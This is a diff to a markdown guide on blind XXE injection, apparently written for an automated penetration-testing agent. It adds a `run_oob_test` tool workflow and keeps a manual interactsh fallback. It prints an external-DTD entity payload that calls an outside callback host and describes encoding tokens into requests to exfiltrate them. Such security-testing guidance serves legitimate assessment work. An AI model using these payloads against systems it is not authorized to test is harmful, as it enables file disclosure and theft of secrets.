@@ -49,9 +49,18 @@ XML External Entity injection is a parser-level failure that enables local file 
 
 - Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
 - Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)
-- Use `interactsh-client -v` for the callback domain. Reference it as the
-  external DTD host (e.g. `<!ENTITY % ex SYSTEM "http://xyz.oast.fun/x.dtd">`)
-  and read the DNS/HTTP hit on the interactsh stdout.
+- **Preferred path — `run_oob_test`.** For a blind-XXE hypothesis with a captured
+  XML request, call `run_oob_test(hypothesis_id=..., request_ref=...,
+  injection_location="body_raw")`. With `body_raw` it replaces the whole body with
+  a SYSTEM-entity document carrying a canary unique to that attempt (or supply your
+  own `payload_template` with `{OOB_URL}` for a parameter-entity/external-DTD
+  variant), replays once, and correlates ONLY that attempt's DNS/HTTP hit — a
+  callback is `needs_validation`, not confirmed. It records the attempt on the
+  worklist automatically.
+- **Manual fallback.** Use `interactsh-client -v` for the callback domain and
+  reference it as the external DTD host (e.g.
+  `<!ENTITY % ex SYSTEM "http://xyz.oast.fun/x.dtd">`), reading the hit on stdout —
+  for sinks/paths the executor can't reach.
 
 ### Timing
 
